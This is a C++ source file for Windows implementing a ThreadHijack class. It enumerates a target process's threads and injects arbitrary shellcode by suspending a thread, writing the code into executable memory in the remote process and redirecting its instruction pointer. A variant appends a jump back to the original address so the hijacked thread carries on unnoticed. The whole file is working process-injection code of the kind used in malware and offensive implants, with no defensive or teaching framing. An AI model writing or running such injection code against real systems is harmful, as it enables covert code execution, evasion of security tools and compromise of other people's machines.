#include "ThreadHijack.h"
#include <tlhelp32.h>

DWORD ThreadHijack::FindThread(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 te = { sizeof(te) };
    DWORD tid = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break; // take the first thread
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    return tid;
}

std::string ThreadHijack::ListThreads(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return "ThreadHijack: snapshot failed";
    std::string r = "Threads in PID " + std::to_string(pid) + ":\n";
    THREADENTRY32 te = { sizeof(te) };
    int count = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            r += "  TID " + std::to_string(te.th32ThreadID) +
                 "  priority=" + std::to_string(te.tpBasePri) + "\n";
            count++;
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    if (count == 0) r += "  (none found)\n";
    return r;
}

DWORD ThreadHijack::Hijack(DWORD pid, DWORD targetTid,
                            const BYTE* shellcode, SIZE_T scSize)
{
    if (targetTid == 0) targetTid = FindThread(pid);
    if (targetTid == 0) return 0;

    HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,   FALSE, targetTid);
    if (!hProc || !hThread) {
        if (hProc)   CloseHandle(hProc);
        if (hThread) CloseHandle(hThread);
        return 0;
    }

    // Suspend the thread
    SuspendThread(hThread);

    // Allocate + write shellcode
    PVOID remote = VirtualAllocEx(hProc, NULL, scSize,
                                   MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T written;
    WriteProcessMemory(hProc, remote, shellcode, scSize, &written);

    // Redirect RIP
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    ctx.Rip = (DWORD64)remote;
    SetThreadContext(hThread, &ctx);

    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return targetTid;
}

DWORD ThreadHijack::HijackRestoring(DWORD pid, DWORD targetTid,
                                     const BYTE* shellcode, SIZE_T scSize)
{
    if (targetTid == 0) targetTid = FindThread(pid);
    if (targetTid == 0) return 0;

    HANDLE hProc   = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS,   FALSE, targetTid);
    if (!hProc || !hThread) {
        if (hProc)   CloseHandle(hProc);
        if (hThread) CloseHandle(hThread);
        return 0;
    }

    SuspendThread(hThread);

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    DWORD64 savedRip = ctx.Rip;

    // Append a "jmp savedRip" tail to the shellcode:
    //   48 B8 xx xx xx xx xx xx xx xx   mov rax, savedRip
    //   FF E0                            jmp rax
    SIZE_T totalSize = scSize + 12;
    std::vector<BYTE> sc(totalSize);
    memcpy(sc.data(), shellcode, scSize);
    sc[scSize+0]  = 0x48; sc[scSize+1] = 0xB8; // mov rax,
    memcpy(&sc[scSize+2], &savedRip, 8);         // savedRip
    sc[scSize+10] = 0xFF; sc[scSize+11] = 0xE0;  // jmp rax

    PVOID remote = VirtualAllocEx(hProc, NULL, totalSize,
                                   MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T written;
    WriteProcessMemory(hProc, remote, sc.data(), totalSize, &written);

    ctx.Rip = (DWORD64)remote;
    SetThreadContext(hThread, &ctx);

    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return targetTid;
}
